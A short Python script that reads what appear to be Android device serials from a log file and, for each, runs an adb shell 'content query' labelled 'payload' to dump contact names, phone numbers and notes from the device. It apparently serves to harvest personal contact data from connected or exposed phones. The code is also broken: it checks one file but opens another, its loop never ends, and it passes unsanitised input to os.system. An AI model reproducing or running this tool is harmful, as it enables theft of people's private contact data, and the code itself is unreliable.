import os

def main():
    if os.path.isfile("logs/online.log"):
        a = open("on.log","r")
        while True:
            a1 = a.readline().strip()
            if not a:
                break
            payload = "content query --uri content://contacts/phones/ --projection display_name:number:notes"
            os.system("adb -s "+a1+" shell "+payload)
        a.close()

main()